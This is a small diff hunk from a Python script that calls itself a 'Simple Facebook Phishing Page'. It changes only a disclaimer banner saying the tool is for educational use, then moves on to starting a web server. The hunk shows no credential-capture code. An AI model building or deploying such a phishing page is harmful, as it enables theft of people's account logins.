@@ -88,7 +88,7 @@ def internal_server_error(e):
 if __name__ == "__main__":
     print(Fore.CYAN + "[*] Simple Facebook Phishing Page Made By Wh1ter0seo4 on github.")
     print("[-] Project's Github Page: https://github.com/Wh1ter0sEo4/SimpleFacebookPhishingPage" + Fore.RESET)
-    print(Fore.RED + "\nDO NOT USE THIS TOOL TO FARM ACTUAL LOGGING CREDENTIALS, IT'S MADE STRICTLY FOR EDUCATIONAL & EXPERIMENTAL REASONS. I, THE CREATOR OF THIS TOOL, AM NOT RESPONSABLE FOR ANY DAMAGE YOU MAY CAUSE.\n" + Fore.RESET)
+    print(Fore.RED + "\nDO NOT USE THIS TOOL TO FARM ACTUAL ACCOUNT CREDENTIALS, IT'S MADE STRICTLY FOR EDUCATIONAL & EXPERIMENTAL REASONS. I, THE CREATOR OF THIS TOOL, AM NOT RESPONSABLE FOR ANY DAMAGE YOU MAY CAUSE.\n" + Fore.RESET)
     time.sleep(1)
     print("[+] Starting Web Server")
     if DEBUG:
